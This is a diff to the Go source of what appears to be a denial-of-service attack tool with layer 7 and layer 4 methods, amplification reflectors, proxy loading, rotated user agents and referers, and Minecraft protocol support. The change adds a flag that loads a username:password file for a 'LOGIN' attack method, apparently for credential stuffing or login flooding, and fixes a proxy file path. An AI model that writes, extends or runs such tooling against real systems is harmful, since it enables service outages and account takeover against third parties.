@@ -82,6 +82,7 @@ func runAttack(args []string, sigChan chan os.Signal) error {
 	userAgentsFile := fs.String("user-agents", "files/useragent.txt", "User agents file")
 	referersFile := fs.String("referers", "files/referers.txt", "Referers file")
 	reflectorsFile := fs.String("reflectors", "", "Reflectors file for amplification attacks")
+	dataFile := fs.String("data", "", "Data file for LOGIN method (username:password)")
 
 	if err := fs.Parse(args[2:]); err != nil {
 		return err
@@ -137,14 +138,21 @@ func runAttack(args []string, sigChan chan os.Signal) error {
 	}
 
 	var proxies []proxy.Proxy
-	var userAgents, referers, reflectors []string
+	var userAgents, referers, reflectors, credentials []string
 
 	if methods.IsLayer7Method(method) {
 		userAgents, _ = utils.LoadRequiredFile(*userAgentsFile, "user agent")
 		referers, _ = utils.LoadRequiredFile(*referersFile, "referer")
 
 		if *proxyFile != "" {
-			proxies, _ = proxy.LoadOrDownloadProxies("files/proxies/"+"*proxyFile", *proxyType, cfg, target, *threads)
+			proxies, _ = proxy.LoadOrDownloadProxies("files/proxies/"+*proxyFile, *proxyType, cfg, target, *threads)
+		}
+
+		if method == "LOGIN" && *dataFile != "" {
+			credentials, err = utils.LoadRequiredFile(*dataFile, "credentials")
+			if err != nil {
+				return err
+			}
 		}
 	} else if methods.IsLayer4Method(method) {
 		if methods.IsAmplificationMethod(method) && *reflectorsFile != "" {
@@ -161,6 +169,7 @@ func runAttack(args []string, sigChan chan os.Signal) error {
 		UserAgents:   userAgents,
 		Referers:     referers,
 		Reflectors:   reflectors,
+		Credentials:  credentials,
 		ProtocolID:   cfg.MinecraftProtocol,
 		RequestsSent: utils.NewCounter(),
 		BytesSent:    utils.NewCounter(),
